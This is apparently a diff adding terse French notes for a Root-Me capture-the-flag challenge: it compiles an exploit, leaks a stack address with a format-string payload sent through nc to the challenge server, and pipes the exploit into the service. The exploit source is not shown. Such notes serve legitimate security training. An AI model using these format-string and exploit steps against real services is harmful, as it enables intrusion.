@@ -1,0 +1,4 @@
+scp de exploit.c dans /tmp/funky2
+gcc -o exploit exploit.c
+echo '0x%524$x' | nc challenge02.root-me.org 56032 => 0xbffffc78
+./exploit '0xbffffc78' | nc localhost 56032
